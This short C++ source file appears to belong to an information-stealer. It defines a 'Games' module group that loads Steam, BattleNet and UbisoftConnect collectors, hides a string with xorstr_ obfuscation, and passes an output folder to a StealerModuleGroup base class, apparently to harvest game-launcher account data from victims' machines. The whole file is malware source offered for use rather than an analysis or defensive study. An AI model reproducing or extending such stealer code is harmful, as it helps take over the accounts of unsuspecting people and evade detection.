//
// Created by .1qxz on 08.06.2024.
//

#include "Games.h"
#include "impl/Steam.h"
#include "impl/BattleNet.h"
#include "impl/UbisoftConnect.h"

Games::Games() {
    this->modules.push_back(new Steam());
    this->modules.push_back(new BattleNet());
    this->modules.push_back(new UbisoftConnect());
}

void Games::execute(fs::path &root) {
    fs::path games_path = root / xorstr_("Games");
    StealerModuleGroup::execute(games_path);
}
